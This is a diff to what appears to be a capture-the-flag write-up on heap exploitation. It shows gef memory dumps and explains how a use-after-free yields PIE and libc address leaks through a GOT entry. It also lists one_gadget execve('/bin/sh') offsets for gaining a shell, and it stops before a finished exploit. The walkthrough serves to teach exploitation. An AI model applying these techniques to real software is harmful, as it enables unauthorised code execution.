@@ -330,6 +330,69 @@ gef➤  x/40g 0x0000602000000000
 
 After that, we can just free that chunk and we will be able reallocate previously used chunks.
 
-### Infoleak
+### PIE and Libc Infoleaks
 
-Now that we can 
+Now that we can allocate previously used memory and have a UAF bug, we can get an infoleak. Let's see what the heap looks like after we go the steps of the overflow section above:
+
+```
+gef➤  x/40g 0x0000602000000000
+0x602000000000:	0x0200000000000000	0x5180000120000010
+0x602000000010:	0x0202020262800001	0x0202020202020202
+0x602000000020:	0x0200000002020200	0x5f800001ffffffff
+0x602000000030:	0x000060201e000001	0x000055c158e2eab0
+```
+
+We can see here that we have two `0x10` chunks that will be allocated. Now the chunks will be allocated in the reverse order that they were allocated. So the bottom chunk will be allocated first, then the top chunk. Now when the chunks are allocated, the chunk with the contents is allocated first followed by the chunk with the pointer and libc pointer in it. So when we allocate another `0x10` byte block with the contents `0x602000000018` and size `0xdeadbeef00` (we need the null byte at the end because the size starts at `0x602000000037`) we get this:
+
+
+```
+gef➤  x/40g 0x0000602000000000
+0x602000000000:	0x02ffffff00000002	0x5f80000120000010
+0x602000000010:	0x0000602000000030	0x000055c158e2eab0
+0x602000000020:	0x02ffffff00000002	0x5180000120000010
+0x602000000030:	0x0000602000000018	0xbe000000deadbeef
+```
+
+When we look at the pointers stored in `notes`, we see these:
+```
+gef➤  x/2g 0x55c159ccacc0
+0x55c159ccacc0:	0x0000602000000030	0x0000602000000010
+```
+
+So we can see that at index `0` we have the pointer `0x0000602000000030`. Now how these chunks work is the chunk that the pointer points to, doesn't actually hold the contents. It holds a pointer to it. Right now that address holds the pointer `0x0000602000000018`, which points to the PIE pointer `0x000055c158e2eab0`. If we were to show the dream at index `0`, it would give us that pointer and we would be able to break aslr for the PIE section. Now that we have the PIE infoleak, we can figure out the address of the got table and use that to get a libc infoleak.
+
+After we use the pie base and the offsets to figure out the address of a got table entry  we can get our libc infoleak. If we try to edit the dream at index `1`, it will edit the memory at `0x0000602000000018` (since that is the pointer stored in `notes` at that index). With that we will be able to overwrite the value at `0x602000000030` with the ID we are editing with. We can write the got address of a function there, then when we got to print the dream at index `0` it will leak the got address for that function.
+
+### One Gadget
+
+Now that we have the heap overflow, and the infoleaks, we can get code execution. First I just used the one gadget tool to find what gadgets there are for us to use (one gadget can be found here https://github.com/david942j/one_gadget):
+
+```
+$ one_gadget libc.so.6 
+0x3f4b6 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x3f50a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xd5a27 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+```
+
+Now we have several one gadgets:
+
+```
+gef➤  x/4g 0x55a19b099cc0
+0x55a19b099cc0: 0x602000000030  0x602000000010
+0x55a19b099cd0: 0x0 0x0
+gef➤  x/10g 0x602000000000 
+0x602000000000: 0x2ffffff00000002 0x5f00000120000010
+0x602000000010: 0x602000000030  0x55a19a1fdab0
+0x602000000020: 0x2ffffff00000002 0x5880000120000010
+0x602000000030: 0x55a19a430e30  0xbe000000deadbe00
+0x602000000040: 0x0 0x0
+```
+
